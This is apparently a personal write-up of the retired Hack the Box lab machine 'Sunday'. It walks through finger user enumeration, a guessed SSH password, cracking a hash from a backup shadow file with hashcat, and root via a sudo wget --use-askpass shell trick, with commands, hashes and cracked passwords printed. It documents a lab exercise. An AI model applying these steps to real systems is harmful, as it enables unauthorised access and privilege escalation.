## 1. Machine Info

Sunday is an easy-rated, retired machine from Hack the Box. Well, I really didn't like this one since it was mainly about guessing or bruteforcing the credentials, including hash-cracking.

![sunday](../contentImages/sunday/sunday.png)

But it was still a good machine to repeat some basic stuffs which we don't always have in our mind.

> As always, let's dive into the machine!

## 2. Recon

Starting with nmap scan:

```
┌──(hosan㉿kali)-[~/oscp/htb-box/sunday]
└─$ sudo nmap 10.10.10.76 -Pn -sC -sV

There is a service named "finger" on port 79. After a quick search:

> The Finger program/service is utilized for retrieving details about computer users. Typically, the information provided includes the user's login name, full name, and, in some cases, additional details.

I can't justify why someone would use this kind of service, but whatever.

## 3. Enumeration

Let's start with a basic interaction

```
┌──(hosan㉿kali)-[~/oscp/htb-box/sunday]
└─$ echo "root" | nc -vn 10.10.10.76 79
(UNKNOWN) [10.10.10.76] 79 (finger) open
Login       Name               TTY         Idle    When    Where
root     Super-User            ssh          <Dec  7, 2023> 10.10.14.46  
```
So it indeed shows us username. 


Let's try user enumeration from PentestMonkey.

```
──(hosan㉿kali)-[~/oscp/htb-box/sunday/finger-user-enum-1.0]
└─$ perl finger-user-enum.pl -U /usr/share/wordlists/seclists/Usernames/Names/names.txt -t 10.10.10.76 -p 79
Starting finger-user-enum v1.0 ( http://pentestmonkey.net/tools/finger-user-enum )

 ----------------------------------------------------------
|                   Scan Information                       |
 ----------------------------------------------------------

Worker Processes ......... 5
Usernames file ........... /usr/share/wordlists/seclists/Usernames/Names/names.txt

root@10.10.10.76: root     Super-User            ssh          <Dec  7, 2023> 10.10.14.46         ..
sammy@10.10.10.76: sammy           ???            ssh          <Apr 13, 2022> 10.10.14.13         ..
sunny@10.10.10.76: sunny           ???            ssh          <Apr 13, 2022> 10.10.14.13         ..
```
So we've got three user: root, sammy, sunny. Pretty obviously, root is (for now) out of scope.

## 4. Initial Foothold

Hmm, but I can't find any remote connection services. Let's try nmap once more with -p-

```
Not shown: 65530 closed tcp ports (reset)
PORT      STATE SERVICE   REASON
79/tcp    open  finger    syn-ack ttl 59
111/tcp   open  rpcbind   syn-ack ttl 63
515/tcp   open  printer   syn-ack ttl 59
6787/tcp  open  smc-admin syn-ack ttl 59
22022/tcp open  unknown   syn-ack ttl 63
```

Oh, so there was a ssh service running on port 22022! 


But here was a tricky part: we had to guess the password of our user. It happens if we look at some really old machines from HTB. I tried with days.txt since our user and machine's name is sunday.

```
┌──(hosan㉿kali)-[~/oscp/htb-box/sunday]

```

so as a result, we've got sunny:sunday.

```
┌──(hosan㉿kali)-[~]
└─$ ssh sunny@10.10.10.76 -p 22022

sunny@sunday:~$ 
```

Got it. But it is truly no fun to brute force or guess some random passwords.

## 5. Shell as sammy & root

I couldn't open user.txt. So let's try privesc. 


After playing around for a while, I found this:

```
sunny@sunday:/backup$ cat agent22.backup 
mysql:NP:::::::
openldap:*LK*:::::::
webservd:*LK*:::::::
postgres:NP:::::::
svctag:*LK*:6445::::::
nobody:*LK*:6445::::::
noaccess:*LK*:6445::::::
nobody4:*LK*:6445::::::
sammy:$5$Ebkn8jlK$i6SSPa0.u7Gd.0oJOT4T421N2OvsfXqAT1vCoYUOigB:6445::::::
sunny:$5$iRMbpnBv$Zh7s6D7ColnogCdiVE5Flz9vCZOMkUFxklRhhaShxv3:17636::::::
```

So we have this password hash, and I really hate it. And don't forget, that :6445.. at the end is not relevant.

```
┌──(hosan㉿kali)-[~/oscp/htb-box/sunday]
└─$ hashcat hash.txt /usr/share/wordlists/rockyou.txt -o cracked.txt
hashcat (v6.2.6) starting in autodetect mode
(used autodetection)


┌──(hosan㉿kali)-[~/oscp/htb-box/sunday]
└─$ cat cracked.txt 
$5$Ebkn8jlK$i6SSPa0.u7Gd.0oJOT4T421N2OvsfXqAT1vCoYUOigB:cooldude!
```

So I logged in as sammy. sudo -l shows us:

```
-bash-5.1$ sudo -l
User sammy may run the following commands on sunday:
    (ALL) ALL
    (root) NOPASSWD: /usr/bin/wget
```
Looking at GTFObins:

```
-bash-5.1$ TF=$(mktemp)
-bash-5.1$ chmod +x $TF
-bash-5.1$ echo -e '#!/bin/sh\n/bin/sh 1>&0' >$TF
-bash-5.1$ sudo wget --use-askpass=$TF 0
root@sunday:/home/sammy# 
```
So I got root. That's it!

## 6. Review

Nah, I really didn't like this one. I tried to find a more "logical" way to get into the machine, but at the end, it was just brute-forcing...
